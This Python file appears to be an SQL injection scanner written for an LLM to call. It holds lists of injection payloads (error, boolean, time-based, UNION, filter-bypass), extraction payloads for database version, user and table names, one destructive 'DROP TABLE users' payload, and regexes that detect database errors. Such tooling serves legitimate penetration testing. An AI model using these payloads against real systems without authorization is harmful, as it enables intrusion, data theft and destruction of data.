"""
SQL Injection Scanner - SQLi Detection
Easy for LLM to test SQL injection vulnerabilities
"""

import re
import time
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

import sys
sys.path.append('..')
from core.http_client import HTTPClient, Response


@dataclass
class SQLiResult:
    """SQL injection test result"""
    vulnerable: bool
    payload: str
    injection_type: str  # error, boolean, time, union
    evidence: str
    database_type: str
    confidence: str
    
    def to_dict(self) -> Dict:
        return {
            "vulnerable": self.vulnerable,
            "payload": self.payload,
            "injection_type": self.injection_type,
            "evidence": self.evidence,
            "database_type": self.database_type,
            "confidence": self.confidence
        }


class SQLiScanner:
    """
    SQL Injection scanner
    
    Usage for LLM:
    - scanner.test_parameter(url, param) - Test parameter for SQLi
    - scanner.test_error_based(url, param) - Error-based detection
    - scanner.test_boolean_based(url, param) - Boolean-based detection
    - scanner.test_time_based(url, param) - Time-based blind detection
    - scanner.get_payloads(db_type) - Get payloads for database type
    """
    
    def __init__(self, client: Optional[HTTPClient] = None):
        self.client = client or HTTPClient()
        
        # Error patterns by database
        self.error_patterns = {
            "mysql": [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
                r"Syntax error or access violation",
                r"SQLSTATE\[42000\]",
            ],
            "postgresql": [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s+syntax error at or near",
            ],
            "mssql": [
                r"Driver.* SQL[\-\_\ ]*Server",
                r"OLE DB.* SQL Server",
                r"SQLServer JDBC Driver",
                r"SqlClient",
                r"com\.microsoft\.sqlserver\.jdbc",
                r"Msg \d+, Level \d+, State \d+",
                r"Unclosed quotation mark after",
            ],
            "oracle": [
                r"ORA-[0-9]{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_",
                r"Warning.*\Wora_",
                r"oracle\.jdbc\.driver",
            ],
            "sqlite": [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"SQLITE_ERROR",
                r"near \".*\": syntax error",
                r"unrecognized token",
            ],
            "generic": [
                r"SQL syntax",
                r"syntax error",
                r"unexpected token",
                r"unclosed quotation",
                r"quoted string not properly terminated",
            ]
        }
        
        # Payloads by technique
        self.payloads = {
            "error_based": [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "1' ORDER BY 1--+",
                "1' ORDER BY 10--+",
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "1; DROP TABLE users--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "' OR ''='",
                "';--",
                "';#",
                "'/*",
                "' OR 1=1#",
            ],
            "boolean_based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                "' OR 1=1--",
                "' OR 1=2--",
                "1 AND 1=1",
                "1 AND 1=2",
                "1' AND 1=1 AND '1'='1",
                "1' AND 1=2 AND '1'='1",
            ],
            "time_based": {
                "mysql": [
                    "' OR SLEEP(5)--",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "1' AND SLEEP(5)--",
                    "' OR BENCHMARK(10000000,MD5('test'))--",
                ],
                "mssql": [
                    "'; WAITFOR DELAY '0:0:5'--",
                    "1; WAITFOR DELAY '0:0:5'--",
                ],
                "postgresql": [
                    "'; SELECT pg_sleep(5)--",
                    "' OR pg_sleep(5)--",
                ],
                "oracle": [
                    "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                ],
                "generic": [
                    "' OR SLEEP(5)--",
                    "'; WAITFOR DELAY '0:0:5'--",
                ]
            },
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT 1,2,3--",
                "0 UNION SELECT NULL--",
                "-1 UNION SELECT 1,2,3--",
            ],
            "stacked_queries": [
                "'; SELECT 1--",
                "'; SELECT user()--",
                "'; SELECT @@version--",
                "'; SELECT version()--",
            ],
            "filter_bypass": [
                "' oR '1'='1",
                "' Or '1'='1",
                "' OR'1'='1",
                "'/**/OR/**/1=1--",
                "' /*!OR*/ 1=1--",
                "' || '1'='1",
                "' && '1'='1",
                "'+OR+'1'='1",
                "'%20OR%20'1'='1",
                "' OR 1=1--+-",
                "' OR 1=1-- -",
            ]
        }
        
        # Information extraction payloads
        self.extraction_payloads = {
            "mysql": {
                "version": "' UNION SELECT @@version--",
                "user": "' UNION SELECT user()--",
                "database": "' UNION SELECT database()--",
                "tables": "' UNION SELECT table_name FROM information_schema.tables--",
            },
            "postgresql": {
                "version": "' UNION SELECT version()--",
                "user": "' UNION SELECT current_user--",
                "database": "' UNION SELECT current_database()--",
            },
            "mssql": {
                "version": "' UNION SELECT @@version--",
                "user": "' UNION SELECT user_name()--",
                "database": "' UNION SELECT db_name()--",
            }
        }

    def detect_database(self, response: Response) -> str:
        """Detect database type from error messages"""
        body = response.body
        
        for db_type, patterns in self.error_patterns.items():
            if db_type == "generic":
                continue
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return db_type
        
        return "unknown"

    def check_sql_error(self, response: Response) -> Dict[str, Any]:
        """Check response for SQL error indicators"""
        body = response.body
        result = {
            "has_error": False,
            "error_type": None,
            "database": "unknown",
            "error_snippet": ""
        }
        
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    result["has_error"] = True
                    result["database"] = db_type if db_type != "generic" else result["database"]
                    result["error_type"] = pattern
                    
                    # Extract error context
                    start = max(0, match.start() - 50)
                    end = min(len(body), match.end() + 100)
                    result["error_snippet"] = body[start:end]
                    return result
        
        return result

    def test_parameter(self, url: str, param: str, method: str = "GET",
                       test_types: Optional[List[str]] = None) -> List[SQLiResult]:
        """
        Test parameter for SQL injection
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method
            test_types: List of test types (error, boolean, time, union)
        
        Returns:
            List of SQLi findings
        """
        test_types = test_types or ["error", "boolean"]
        results = []
        
        # Get baseline response
        baseline = self.client.inject_payload(url, param, "test123", method)
        baseline_length = len(baseline.body)
        
        for test_type in test_types:
            if test_type == "error":
                results.extend(self.test_error_based(url, param, method))
            elif test_type == "boolean":
                results.extend(self.test_boolean_based(url, param, method, baseline_length))
            elif test_type == "time":
                results.extend(self.test_time_based(url, param, method))
            elif test_type == "union":
                results.extend(self.test_union_based(url, param, method))
        
        return results

    def test_error_based(self, url: str, param: str, 
                         method: str = "GET") -> List[SQLiResult]:
        """Test for error-based SQL injection"""
        results = []
        
        for payload in self.payloads["error_based"]:
            response = self.client.inject_payload(url, param, payload, method)
            error_info = self.check_sql_error(response)
            
            if error_info["has_error"]:
                results.append(SQLiResult(
                    vulnerable=False,
                    payload=payload,
                    injection_type="error_based",
                    evidence="Hypothesis only: SQL error-like text observed (not proof of exploitability)",
                    database_type=error_info["database"],
                    confidence="low"
                ))
        
        return results

    def test_boolean_based(self, url: str, param: str, method: str = "GET",
                           baseline_length: int = 0) -> List[SQLiResult]:
        """Test for boolean-based SQL injection"""
        results = []
        
        # Get baseline if not provided
        if not baseline_length:
            baseline = self.client.inject_payload(url, param, "1", method)
            baseline_length = len(baseline.body)
        
        # Test true/false pairs
        pairs = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' OR 1=1--", "' OR 1=2--"),
        ]
        
        for true_payload, false_payload in pairs:
            true_resp = self.client.inject_payload(url, param, true_payload, method)
            false_resp = self.client.inject_payload(url, param, false_payload, method)
            
            true_len = len(true_resp.body)
            false_len = len(false_resp.body)
            
            # Check for significant difference
            diff_ratio = abs(true_len - false_len) / max(true_len, false_len, 1)
            
            if diff_ratio > 0.1 or (true_resp.status_code != false_resp.status_code):
                results.append(SQLiResult(
                    vulnerable=False,
                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    injection_type="boolean_based",
                    evidence="Hypothesis only: response differences observed (not proof per confirmation rules)",
                    database_type="unknown",
                    confidence="low"
                ))
        
        return results

    def test_time_based(self, url: str, param: str, method: str = "GET",
                        delay: int = 5) -> List[SQLiResult]:
        """Test for time-based blind SQL injection"""
        results = []
        
        # Get baseline timing
        start = time.time()
        self.client.inject_payload(url, param, "1", method)
        baseline_time = time.time() - start
        
        for db_type, payloads in self.payloads["time_based"].items():
            for payload in payloads:
                start = time.time()
                response = self.client.inject_payload(url, param, payload, method)
                elapsed = time.time() - start
                
                # Check if response was delayed
                if elapsed > baseline_time + delay - 1:  # Allow 1 second tolerance
                    results.append(SQLiResult(
                        vulnerable=False,
                        payload=payload,
                        injection_type="time_based_blind",
                        evidence="Hypothesis only: request appeared slower; confirm via multi-sample timing + zero-delay control",
                        database_type=db_type if db_type != "generic" else "unknown",
                        confidence="low"
                    ))
        
        return results

    def test_union_based(self, url: str, param: str, 
                         method: str = "GET") -> List[SQLiResult]:
        """Test for UNION-based SQL injection"""
        results = []
        
        # First, determine number of columns
        column_count = self._detect_columns(url, param, method)
        
        if column_count:
            # Try UNION with detected column count
            nulls = ",".join(["NULL"] * column_count)
            payload = f"' UNION SELECT {nulls}--"
            
            response = self.client.inject_payload(url, param, payload, method)
            
            if response.status_code == 200 and "NULL" not in response.body.lower():
                results.append(SQLiResult(
                    vulnerable=False,
                    payload=payload,
                    injection_type="union_based",
                    evidence="Hypothesis only: UNION-like behavior suspected (not proof per confirmation rules)",
                    database_type=self.detect_database(response),
                    confidence="low"
                ))
        
        return results

    def _detect_columns(self, url: str, param: str, method: str = "GET",
                        max_columns: int = 10) -> int:
        """Detect number of columns for UNION injection"""
        for i in range(1, max_columns + 1):
            # Try ORDER BY
            payload = f"' ORDER BY {i}--"
            response = self.client.inject_payload(url, param, payload, method)
            
            if self.check_sql_error(response)["has_error"]:
                return i - 1
        
        return 0

    def get_payloads(self, category: str = "all", 
                     db_type: str = "generic") -> Dict[str, Any]:
        """Get payloads for LLM to use"""
        if category == "all":
            return self.payloads
        elif category == "time_based":
            return self.payloads["time_based"].get(db_type, self.payloads["time_based"]["generic"])
        elif category == "extraction":
            return self.extraction_payloads.get(db_type, {})
        return {category: self.payloads.get(category, [])}

    def generate_payload(self, technique: str, columns: int = 3,
                        db_type: str = "mysql", data_to_extract: str = "version") -> str:
        """
        Generate custom SQL injection payload
        
        Args:
            technique: error, boolean, time, union
            columns: Number of columns for UNION
            db_type: Target database type
            data_to_extract: What to extract (version, user, database)
        
        Returns:
            Generated payload
        """
        if technique == "union":
            if data_to_extract == "version":
                if db_type == "mysql":
                    return f"' UNION SELECT {'NULL,'*(columns-1)}@@version--"
                elif db_type == "postgresql":
                    return f"' UNION SELECT {'NULL,'*(columns-1)}version()--"
            elif data_to_extract == "user":
                if db_type == "mysql":
                    return f"' UNION SELECT {'NULL,'*(columns-1)}user()--"
                elif db_type == "mssql":
                    return f"' UNION SELECT {'NULL,'*(columns-1)}user_name()--"
        
        elif technique == "time":
            if db_type == "mysql":
                return "' OR SLEEP(5)--"
            elif db_type == "mssql":
                return "'; WAITFOR DELAY '0:0:5'--"
            elif db_type == "postgresql":
                return "'; SELECT pg_sleep(5)--"
        
        elif technique == "error":
            return "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        
        return "' OR 1=1--"

    def analyze_response(self, response: Response, payload: str) -> Dict[str, Any]:
        """Analyze response for SQL injection indicators"""
        error_info = self.check_sql_error(response)
        
        return {
            "payload": payload,
            "status_code": response.status_code,
            "has_sql_error": error_info["has_error"],
            "database_detected": error_info["database"],
            "error_snippet": error_info["error_snippet"],
            "response_length": len(response.body),
            "indicators": {
                "error_based": error_info["has_error"],
                "likely_vulnerable": error_info["has_error"] or "'1'='1" in response.body
            }
        }

    def get_summary(self, results: List[SQLiResult]) -> Dict[str, Any]:
        """Get summary of SQLi scan results"""
        vulnerable = [r for r in results if r.vulnerable]
        
        return {
            "total_tests": len(results),
            "vulnerable_count": len(vulnerable),
            "injection_types": list(set(r.injection_type for r in vulnerable)),
            "databases_detected": list(set(r.database_type for r in vulnerable if r.database_type != "unknown")),
            "vulnerable_payloads": [r.payload for r in vulnerable],
            "highest_confidence": max((r.confidence for r in vulnerable), default="none")
        }
